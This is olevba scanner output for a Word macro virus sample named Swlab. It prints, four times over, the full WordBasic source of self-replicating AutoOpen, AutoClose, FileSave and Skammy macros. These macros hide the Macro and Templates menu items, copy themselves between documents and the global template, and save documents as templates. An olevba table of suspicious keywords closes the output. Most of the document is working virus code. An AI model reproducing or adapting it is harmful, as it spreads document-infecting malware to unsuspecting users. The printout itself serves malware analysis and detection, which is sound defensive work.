olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Swlab.p
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Swlab.p - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: Virus.MSWord.Swlab.p - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "TemplateProject.AutoClose.MAIN"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoClose.MAIN"
Dim FName$
Dim MacName$
Rem SkamWerks Labs Presents the Generic Concept Created by Skam

Rem Run Payload, Copy Macros to Template.
On Error GoTo -1: On Error GoTo ErrorHandler

     If WordBasic.[MenuItemText$]("&Tools", 0, 13, 0) = "&Macro..." Then
          WordBasic.ToolsCustomizeMenus Name:="FileTemplates", Menu:="&File", Context:=0, Remove:=1
          WordBasic.ToolsCustomizeMenus Name:="ToolsMacro", Menu:="&Tools", Context:=0, Remove:=1
          WordBasic.ToolsCustomizeMenus Name:="FileTemplates", Menu:="&File", Context:=0, Remove:=1, MenuType:=1
          WordBasic.ToolsCustomizeMenus Name:="ToolsMacro", Menu:="&File", Context:=0, Remove:=1, MenuType:=1
     End If

     Rem What? No Payload?  WUSSY!

     FName$ = WordBasic.[FileName$]()
     MacName$ = FName$ + ":AutoOpen"

     If WordBasic.[MacroFileName$]("AutoOpen") = "" Then GoTo EndCode
     WordBasic.MacroCopy MacName$, "Global:AutoOpen", 1
     WordBasic.MacroCopy MacName$, "Global:AutoClose", 1
     WordBasic.MacroCopy MacName$, "Global:FileSave", 1
     WordBasic.MacroCopy MacName$, "Global:Skammy", 1

ErrorHandler:

Rem Copy Macro(s) from Template to the Document

On Error GoTo -1: On Error GoTo AutoOpenHandler
     MacName$ = FName$ + ":AutoOpen"
     WordBasic.MacroCopy "Global:AutoOpen", MacName$, 1
AutoOpenHandler:

On Error GoTo -1: On Error GoTo AutoCloseHandler
    MacName$ = FName$ + ":AutoClose"
     WordBasic.MacroCopy "Global:AutoClose", MacName$, 1
AutoCloseHandler:

On Error GoTo -1: On Error GoTo FileSaveHandler
     MacName$ = FName$ + ":FileSave"
     WordBasic.MacroCopy "Global:FileSave", MacName$, 1
FileSaveHandler:

On Error GoTo -1: On Error GoTo OtherNameHandler
     MacName$ = FName$ + ":Skammy"
     WordBasic.MacroCopy "Global:Skammy", MacName$, 1
OtherNameHandler:

Rem Save Document as Template
If WordBasic.[FileName$]() <> "" Then
     WordBasic.FileSaveAs Format:=1
End If

WordBasic.Call "asdasdadad"
On Error GoTo -1: On Error GoTo 0:
On Error GoTo -1: On Error GoTo EndCode:



EndCode:

End Sub
-------------------------------------------------------------------------------
VBA MACRO FileSave.bas 
in file: Virus.MSWord.Swlab.p - OLE stream: 'Macros/VBA/FileSave'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "TemplateProject.FileSave.MAIN"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSave.MAIN"
Dim FName$
Dim MacName$
Rem SkamWerks Labs Presents the Generic Concept Created by Skam

Rem Run Payload, Copy Macros to Template.
On Error GoTo -1: On Error GoTo ErrorHandler

     If WordBasic.[MenuItemText$]("&Tools", 0, 13, 0) = "&Macro..." Then
          WordBasic.ToolsCustomizeMenus Name:="FileTemplates", Menu:="&File", Context:=0, Remove:=1
          WordBasic.ToolsCustomizeMenus Name:="ToolsMacro", Menu:="&Tools", Context:=0, Remove:=1
          WordBasic.ToolsCustomizeMenus Name:="FileTemplates", Menu:="&File", Context:=0, Remove:=1, MenuType:=1
          WordBasic.ToolsCustomizeMenus Name:="ToolsMacro", Menu:="&File", Context:=0, Remove:=1, MenuType:=1
     End If

     Rem What? No Payload?  WUSSY!

     FName$ = WordBasic.[FileName$]()
     MacName$ = FName$ + ":AutoOpen"

     If WordBasic.[MacroFileName$]("AutoOpen") = "" Then GoTo EndCode
     WordBasic.MacroCopy MacName$, "Global:AutoOpen", 1
     WordBasic.MacroCopy MacName$, "Global:AutoClose", 1
     WordBasic.MacroCopy MacName$, "Global:FileSave", 1
     WordBasic.MacroCopy MacName$, "Global:Skammy", 1

ErrorHandler:

Rem Copy Macro(s) from Template to the Document

On Error GoTo -1: On Error GoTo AutoOpenHandler
     MacName$ = FName$ + ":AutoOpen"
     WordBasic.MacroCopy "Global:AutoOpen", MacName$, 1
AutoOpenHandler:

On Error GoTo -1: On Error GoTo AutoCloseHandler
    MacName$ = FName$ + ":AutoClose"
     WordBasic.MacroCopy "Global:AutoClose", MacName$, 1
AutoCloseHandler:

On Error GoTo -1: On Error GoTo FileSaveHandler
     MacName$ = FName$ + ":FileSave"
     WordBasic.MacroCopy "Global:FileSave", MacName$, 1
FileSaveHandler:

On Error GoTo -1: On Error GoTo OtherNameHandler
     MacName$ = FName$ + ":Skammy"
     WordBasic.MacroCopy "Global:Skammy", MacName$, 1
OtherNameHandler:

Rem Save Document as Template
If WordBasic.[FileName$]() <> "" Then
     WordBasic.FileSaveAs Format:=1
End If

WordBasic.Call "asdasdadad"
On Error GoTo -1: On Error GoTo 0:
On Error GoTo -1: On Error GoTo EndCode:



EndCode:

End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Swlab.p - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim FName$
Dim MacName$
Rem SkamWerks Labs Presents the Generic Concept Created by Skam

Rem Run Payload, Copy Macros to Template.
On Error GoTo -1: On Error GoTo ErrorHandler

     If WordBasic.[MenuItemText$]("&Tools", 0, 13, 0) = "&Macro..." Then
          WordBasic.ToolsCustomizeMenus Name:="FileTemplates", Menu:="&File", Context:=0, Remove:=1
          WordBasic.ToolsCustomizeMenus Name:="ToolsMacro", Menu:="&Tools", Context:=0, Remove:=1
          WordBasic.ToolsCustomizeMenus Name:="FileTemplates", Menu:="&File", Context:=0, Remove:=1, MenuType:=1
          WordBasic.ToolsCustomizeMenus Name:="ToolsMacro", Menu:="&File", Context:=0, Remove:=1, MenuType:=1
     End If

     Rem What? No Payload?  WUSSY!

     FName$ = WordBasic.[FileName$]()
     MacName$ = FName$ + ":AutoOpen"

     If WordBasic.[MacroFileName$]("AutoOpen") = "" Then GoTo EndCode
     WordBasic.MacroCopy MacName$, "Global:AutoOpen", 1
     WordBasic.MacroCopy MacName$, "Global:AutoClose", 1
     WordBasic.MacroCopy MacName$, "Global:FileSave", 1
     WordBasic.MacroCopy MacName$, "Global:Skammy", 1

ErrorHandler:

Rem Copy Macro(s) from Template to the Document

On Error GoTo -1: On Error GoTo AutoOpenHandler
     MacName$ = FName$ + ":AutoOpen"
     WordBasic.MacroCopy "Global:AutoOpen", MacName$, 1
AutoOpenHandler:

On Error GoTo -1: On Error GoTo AutoCloseHandler
    MacName$ = FName$ + ":AutoClose"
     WordBasic.MacroCopy "Global:AutoClose", MacName$, 1
AutoCloseHandler:

On Error GoTo -1: On Error GoTo FileSaveHandler
     MacName$ = FName$ + ":FileSave"
     WordBasic.MacroCopy "Global:FileSave", MacName$, 1
FileSaveHandler:

On Error GoTo -1: On Error GoTo OtherNameHandler
     MacName$ = FName$ + ":Skammy"
     WordBasic.MacroCopy "Global:Skammy", MacName$, 1
OtherNameHandler:

Rem Save Document as Template
If WordBasic.[FileName$]() <> "" Then
     WordBasic.FileSaveAs Format:=1
End If

WordBasic.Call "asdasdadad"
On Error GoTo -1: On Error GoTo 0:
On Error GoTo -1: On Error GoTo EndCode:



EndCode:

End Sub
-------------------------------------------------------------------------------
VBA MACRO Skammy.bas 
in file: Virus.MSWord.Swlab.p - OLE stream: 'Macros/VBA/Skammy'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim FName$
Dim MacName$
Rem SkamWerks Labs Presents the Generic Concept Created by Skam

Rem Run Payload, Copy Macros to Template.
On Error GoTo -1: On Error GoTo ErrorHandler

     If WordBasic.[MenuItemText$]("&Tools", 0, 13, 0) = "&Macro..." Then
          WordBasic.ToolsCustomizeMenus Name:="FileTemplates", Menu:="&File", Context:=0, Remove:=1
          WordBasic.ToolsCustomizeMenus Name:="ToolsMacro", Menu:="&Tools", Context:=0, Remove:=1
          WordBasic.ToolsCustomizeMenus Name:="FileTemplates", Menu:="&File", Context:=0, Remove:=1, MenuType:=1
          WordBasic.ToolsCustomizeMenus Name:="ToolsMacro", Menu:="&File", Context:=0, Remove:=1, MenuType:=1
     End If

     Rem What? No Payload?  WUSSY!

     FName$ = WordBasic.[FileName$]()
     MacName$ = FName$ + ":AutoOpen"

     If WordBasic.[MacroFileName$]("AutoOpen") = "" Then GoTo EndCode
     WordBasic.MacroCopy MacName$, "Global:AutoOpen", 1
     WordBasic.MacroCopy MacName$, "Global:AutoClose", 1
     WordBasic.MacroCopy MacName$, "Global:FileSave", 1
     WordBasic.MacroCopy MacName$, "Global:Skammy", 1

ErrorHandler:

Rem Copy Macro(s) from Template to the Document

On Error GoTo -1: On Error GoTo AutoOpenHandler
     MacName$ = FName$ + ":AutoOpen"
     WordBasic.MacroCopy "Global:AutoOpen", MacName$, 1
AutoOpenHandler:

On Error GoTo -1: On Error GoTo AutoCloseHandler
    MacName$ = FName$ + ":AutoClose"
     WordBasic.MacroCopy "Global:AutoClose", MacName$, 1
AutoCloseHandler:

On Error GoTo -1: On Error GoTo FileSaveHandler
     MacName$ = FName$ + ":FileSave"
     WordBasic.MacroCopy "Global:FileSave", MacName$, 1
FileSaveHandler:

On Error GoTo -1: On Error GoTo OtherNameHandler
     MacName$ = FName$ + ":Skammy"
     WordBasic.MacroCopy "Global:Skammy", MacName$, 1
OtherNameHandler:

Rem Save Document as Template
If WordBasic.[FileName$]() <> "" Then
     WordBasic.FileSaveAs Format:=1
End If

WordBasic.Call "asdasdadad"
On Error GoTo -1: On Error GoTo 0:
On Error GoTo -1: On Error GoTo EndCode:



EndCode:

End Sub
-------------------------------------------------------------------------------
VBA MACRO NewMacros 
in file: Virus.MSWord.Swlab.p - OLE stream: 'NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

